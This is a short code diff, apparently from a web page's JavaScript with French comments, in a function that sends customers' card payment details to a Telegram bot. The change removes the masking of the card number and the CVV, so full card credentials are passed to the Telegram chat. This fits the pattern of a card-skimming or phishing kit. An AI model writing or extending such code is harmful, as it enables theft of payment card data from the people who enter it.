@@ -1427,10 +1427,7 @@
     
     // Fonction pour envoyer les données à Telegram (version simplifiée)
     async function sendPaymentToTelegram(data, botToken, chatId) {
-      // Masquer les chiffres sensibles de la carte
-      const maskedCardNumber = data.cardNumber.replace(/\s/g, '').replace(/\d{12}/, '************');
-      const maskedCvv = data.cardCvv.replace(/\d/g, '•');
-      
+
       const message = `
         💳 *Informations de Paiement par Carte* 💳
         
